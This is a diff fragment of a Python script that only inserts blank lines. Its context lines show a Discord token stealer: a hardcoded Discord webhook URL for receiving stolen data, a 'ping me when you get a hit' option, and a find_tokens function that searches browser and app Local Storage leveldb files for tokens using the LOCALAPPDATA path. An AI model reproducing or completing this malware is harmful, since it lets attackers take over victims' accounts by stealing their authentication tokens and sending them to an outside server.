@@ -10,6 +10,7 @@ WEBHOOK_URL = 'https://discord.com/api/webhooks/1020340454367187025/YMhhe4hXKimA
 # mentions you when you get a hit
 PING_ME = False
 
+
 def find_tokens(path):
     path += '\\Local Storage\\leveldb'
 
@@ -24,6 +25,7 @@ def find_tokens(path):
                 for token in re.findall(regex, line):
                     tokens.append(token)
     return tokens
+
 
 def main():
     local = os.getenv('LOCALAPPDATA')
@@ -70,5 +72,6 @@ def main():
     except:
         pass
     return message
+
 
 print(main())
